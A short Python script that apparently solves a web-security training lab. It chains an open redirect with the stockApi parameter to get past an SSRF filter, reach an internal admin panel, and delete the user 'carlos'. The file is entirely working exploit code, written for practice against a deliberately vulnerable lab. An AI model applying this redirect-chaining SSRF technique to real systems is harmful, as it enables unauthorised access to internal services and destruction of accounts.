import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession

lab = LabSession()

# the stockApi filter blocks direct requests to internal IPs
# but the app has an open redirect on /product/nextProduct
# chain: stockApi -> allowed domain redirect -> internal admin panel
# the filter validates the initial URL, not where the redirect lands

lab.info("Chaining open redirect with SSRF...")
redirect_path = "/product/nextProduct?currentProductId=6&path=http://192.168.0.12:8080/admin"

resp = lab.post("/product/stock", data={
    "stockApi": lab.url(redirect_path)
})

if resp.status_code == 200 and "carlos" in resp.text:
    lab.success("Got admin panel via redirect chain, deleting carlos...")
    delete_path = "/product/nextProduct?currentProductId=6&path=http://192.168.0.12:8080/admin/delete?username=carlos"
    lab.post("/product/stock", data={
        "stockApi": lab.url(delete_path)
    })
else:
    lab.fail(f"Redirect chain failed (status {resp.status_code})")

lab.check_solved()
